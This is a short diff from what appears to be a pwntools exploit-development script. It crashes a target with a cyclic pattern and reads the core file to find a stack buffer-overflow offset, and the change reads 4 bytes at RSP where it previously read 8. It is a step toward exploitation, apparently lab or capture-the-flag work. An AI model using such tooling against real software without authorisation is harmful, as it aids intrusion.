@@ -10,7 +10,7 @@ payload = cyclic(200)
 p.sendline(payload)
 p.wait()  
 core = p.corefile 
-offset = cyclic_find(core.read(core.rsp, 8))
+offset = cyclic_find(core.read(core.rsp, 4))
 log.success(f"Offset found: {offset}")
 p.close()
 
